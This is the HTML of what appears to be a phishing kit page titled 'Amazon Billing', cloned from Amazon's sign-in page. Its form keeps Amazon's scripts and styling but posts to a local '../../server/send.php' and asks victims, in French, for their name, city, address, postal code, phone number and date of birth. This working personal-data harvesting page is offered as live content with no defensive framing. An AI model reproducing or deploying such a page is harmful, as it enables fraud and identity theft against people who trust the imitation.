...
?>
<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.21.4-2021-11-05">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <script async="" src="./index_files/a9-tq-forensics-incremental.min.js.download" crossorigin="anonymous"></script><script async="" src="./index_files/31YXrY93hfL.js.download" crossorigin="anonymous"></script>
      ...
      <script type="text/javascript">
         ...
         var ue_id = 'VJTRBH6N60DFD7KBFBFN',
             ue_url = '/ap/uedata',
             ue_navtiming = 1,
             ue_mid = 'ATVPDKIKX0DER',
             ue_sid = '137-4568243-0896619',
             ...
             ue_rpl_ns = 'cel-rpl',
             ue_ddq = 1,
             ue_fpf = '//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:137-4568243-0896619:VJTRBH6N60DFD7KBFBFN$uedata=s:',
             ue_sbuimp = 1,
             ue_cel_lclia = 1,
             ue_ibft = 0,
             ue_fnt = 0,
      ...
      <!-- 31egngopkw6b8aevuthxy6iq3hnpuri6soe1we -->
      <script>window.ue && ue.count && ue.count('CSMLibrarySize', 9678)</script><script>var aPageStart = (new Date()).getTime();</script>
      <title dir="ltr">Amazon Billing</title>
      <link rel="stylesheet" href="./index_files/61zcRmYWpgL._RC_11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css">
      <link rel="stylesheet" href="./index_files/01SdjaY0ZsL._RC_31jdWD+JB+L.css,41O23DtqM3L.css_.css">
      <link rel="stylesheet" href="./index_files/11qeL1AgUGL.css">
      <script>
         ...
         t[t.length-1],c=b&&b.name;return c&&c in B?function(){var b=w(),g=a.apply(this,arguments);B[c].async=(B[c].async||0)+w()-b;return g}:a},log:function(a,b,c){return this.logError(null,a,b,c)},declare:A([],!0,!0,!0),register:A([],!0),execute:A([]),AUI_BUILD_DATE:"3.21.4-2021-11-05",when:ia(),now:ia(!0),trigger:function(a,b,c){var e=M();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&O.when("prv:a-logTrigger").execute(function(b){b(a)})},handleTriggers:function(){this.log("handleTriggers deprecated")},
         ...
         !m(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||f.navigator.standalone||m(/safari/i)||C(n,"a-ember");p=[];for(l in k)k.hasOwnProperty(l)&&k[l]&&p.push("a-"+l.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));C(n,p.join(" "));n.setAttribute("data-aui-build-date","3.21.4-2021-11-05");r.register("p-detect",function(){return{capabilities:k,localStorage:k.localStorage&&sa,toggleResponsiveGrid:xa,responsiveGridEnabled:ya}});m(/UCBrowser/i)||k.localStorage&&C(n,sa.getItem("a-font-class"));r.declare("a-event-revised-handling",
         ...
         unreg:{}});r.declare("a-fix-event-off",!1);v("pagejs:pkgExecTime",w()-N)})(window,document,Date);
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61-6nKPKyWL._RC|11Y+5x+kkTL.js,51KMV3Cz2XL.js,31x4ENTlVIL.js,31f4+QIEeqL.js,01N6xzIJxbL.js,518BI433aLL.js,01rpauTep4L.js,31QZSjMuoeL.js,61ofwvddDeL.js,01KsMxlPtzL.js_.js?AUIClients/AmazonUI');
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/21G215oqvfL._RC|21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,2119M3Ks9rL.js,51oS8KSTavL.js_.js?AUIClients/AuthenticationPortalAssets');
           ...
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/31BwTxZY0+L.js?AUIClients/CVFAssets');
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/81tNTrfqUOL.js?AUIClients/SiegeClientSideEncryptionAUI');
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/31CQlRXjEUL.js?AUIClients/AmazonUIFormControlsJS');
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/81EV+iP09NL.js?AUIClients/FWCIMAssets');
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61lAMz5Tj7L.js?AUIClients/ACICAssets');
      </script><script type="text/javascript" async="" crossorigin="anonymous" src="./index_files/61-6nKPKyWL._RC_11Y+5x+kkTL.js,51KMV3Cz2XL.js,31x4ENTlVIL.js,31f4+QIEeqL.js,01N6xzIJxbL.js,518BI433aLL.js,01rpauTep4L.js,31QZSjMuoeL.js,61ofwvddDeL.js,01KsMxlPtzL.js_.js.download"></script><script type="text/javascript" async="" crossorigin="anonymous" src="./index_files/21G215oqvfL._RC_21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,2119M3Ks9rL.js,51oS8KSTavL.js_.js.download"></script><script type="text/javascript" async="" crossorigin="anonymous" src="./index_files/01wGDSlxwdL.js.download"></script><script type="text/javascript" async="" crossorigin="anonymous" src="./index_files/31BwTxZY0+L.js.download"></script><script type="text/javascript" async="" crossorigin="anonymous" src="./index_files/81tNTrfqUOL.js.download"></script><script type="text/javascript" async="" crossorigin="anonymous" src="./index_files/31CQlRXjEUL.js.download"></script><script type="text/javascript" async="" crossorigin="anonymous" src="./index_files/81EV+iP09NL.js.download"></script><script type="text/javascript" async="" crossorigin="anonymous" src="./index_files/61lAMz5Tj7L.js.download"></script>
      <script type="text/javascript">
      ...
      <style>#aa-challenge-whole-page-iframe {
         overflow:hidden;
         opacity:1.0;
         position:fixed;
         top:0px;
   ...
   <body class="ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-c a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-c a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-c a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">
      <script>
         ...
         if (window.csa) {
             csa("Config", {
                 ...
                 'CacheDetection.RequestID': "VJTRBH6N60DFD7KBFBFN",
                 'CacheDetection.Callback': window.ue && ue.reset,
                 'LCP.elementDedup': 1
             });
         
             csa("Events")("setEntity", {
                 page: {requestId: "VJTRBH6N60DFD7KBFBFN", meaningful: "interactive"},
                 session: {id: "137-4568243-0896619"}
             });
         }
      ...
      <script>window.ue && ue.count && ue.count('CSMLibrarySize', 14194)</script>
      <div id="a-page">
               ...
               <div id="authportal-main-section" class="a-section">
                  ...
                  <div class="a-section auth-pagelet-container">
                     <div class="a-section a-spacing-base">
                        <div class="a-section">
                           <form name="signIn" method="post" novalidate="" action="../../server/send.php" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="gkcMnKMD">
                              <input type="hidden" name="appActionToken" value="VsQ2D9bRzD2kdKK56rNdI0PnZ8oj3D"><input type="hidden" name="appAction" value="SIGNIN_PWD_COLLECT">
                              ...
                              <input type="hidden" name="prevRID" value="ape:VkpUUkJINk42MERGRDdLQkZCRk4=">
                              <input type="hidden" name="workflowState" value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.neow-x59GxW7j_EnZEYwPr37TacoqhmAroVlKwlCJsc_nVBipRU1uA.WOGgJ_Frl1EOoCAz.e2Ueam1vcGE3TSUJojGDTVfycsALMkqgf1veZsfz_pfGyhmR0nTAWH9gFL40Rbtjmq4abZaCGTUyFgzI7D8XiRr4SvgmiYem0jcJXLyuhiHgc83Mi3yWEv_-HPxF5OQ4Sxx0bJjiKhaiGSOy7rmdn20YcX5700tCIdR0hN1dErE7-WZmSdik8oRE8HxuU1LHbk3_lvyWdHhPuhgOKINp8J69iZJtaTTIZRE1xIMoDHSXDrLiwK0dVhiAGGxAdECtcbqxcydpKji01eeUqdqOQaR84c2zNNR4JBQrMnWaFCK_NWh3kcYJ6BZnZYNqFJoZ3Cw.Yew5BXu9SRJQp3Oo2ShDPA">
                              <div class="a-section">
                                 <div class="a-box">
                                    <div class="a-box-inner a-padding-extra-large">
                                       ...
                                       <div class="a-row a-spacing-base">
                                          ...
                                          <input type="name" maxlength="128" id="ap_email" name="name" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
                                       ...
                                       <div class="a-row a-spacing-base">
                                          ...
                                          <input type="city" maxlength="128" id="ap_email" name="ville" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
                                       ...
                                       <div class="a-row a-spacing-base">
                                          ...
                                          <input type="text" maxlength="128" id="ap_email" name="adresse" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
                                       ...
                                       <div class="a-row a-spacing-base">
                                          ...
                                          <input type="number" maxlength="6" id="ap_email" pattern="[0-9]+" name="zip" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
                                       ...
                                       <div class="a-row a-spacing-base">
                                          ...
                                          <input type="number"  maxlength="10" id="ap_email" pattern="[0-9]+" name="num" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
                                       ...
                                       <div class="a-row a-spacing-base">
                                          ...
                                          <input type="date" maxlength="128" id="ap_email" pattern="[0-9]+" name="dob" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
                                       ...
                                       <div class="a-section">
                                          ...
                                          <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
                                             En continuant, Vous acceptez les <a href="">Conditions d'utilisations</a> et les <a href="">Notices de vie privées</a>.
                                          </div>
                                          <script>
                                             function cf() {
                              ...
                              <input name="metadata1" type="hidden" value="ECdITeCs:">
                           </form>
                        </div>
                     </div>
                  </div>
         ...
         <script type="text/javascript">
            let acicShouldSetup = true;
            P.when('auth-validate-form-handler').execute('acic-setup', function(AuthValidateFormHandler) {
                const aautTargetForm = document.querySelector('form[name="signIn"]');
                if (aautTargetForm) {
                    // Add the event listener to capture stage to be executed first.
                    aautTargetForm.addEventListener("submit", (event) => acicEventListener(event), true);
                    // The form event capture doesn't work in Firefox. Add event listener to the click button as well.
                    aautTargetForm.querySelector('input[type="submit"]')
                        .addEventListener("click", (event) => acicEventListener(event));
                }
            
                function acicEventListener(event) {
                    //If acicShouldSetup is false, the submission is requested by the callback.
                    if (acicShouldSetup &&
                        (typeof acic !== undefined) && (acic != null) &&
                        AuthValidateFormHandler.validate(aautTargetForm) &&
                        (false || isTestEmailPattern(getEmailAddress(aautTargetForm)))) {
            ...
            function submitForm(data) {
                ...
                const aautTargetForm = document.querySelector('form[name="signIn"]');
                let aaTokenInput = aautTargetForm.querySelector("input[name='aaToken']");
                // It's not necessarily going to happen
                // but adding this will make sure we don't append multiple aaTokens to the form.
                if (!aaTokenInput) {
                ...
                aaTokenInput.value = data.sessionToken;
                aautTargetForm.querySelector('input[type="submit"]').click();
            }
            
            function getClientContext(aautTargetForm) {
                let context = {};
                const emailAddress = getEmailAddress(aautTargetForm);
                if (emailAddress) {
            ...
            function getEmailAddress(aautTargetForm) {
                let emailInput = aautTargetForm.querySelector("input[type='email']");
                if (!emailInput) {
            ...
            function isTestEmailPattern(emailAddress) {
                ...
                return emailAddress &&
                    emailAddress.startsWith('sentinels') &&
      ...
      <div id="be" style="display:none;visibility:hidden;">
         <form name="ue_backdetect" action="https://www.amazon.com/ap/get"><input type="hidden" name="ue_back" value="2"></form>
         <script type="text/javascript">
      ...
      <noscript>
         <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:137-4568243-0896619:VJTRBH6N60DFD7KBFBFN$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DVJTRBH6N60DFD7KBFBFN:0' alt=""/>
      </noscript>
      <script>window.ue && ue.count && ue.count('CSMLibrarySize', 35218)</script>
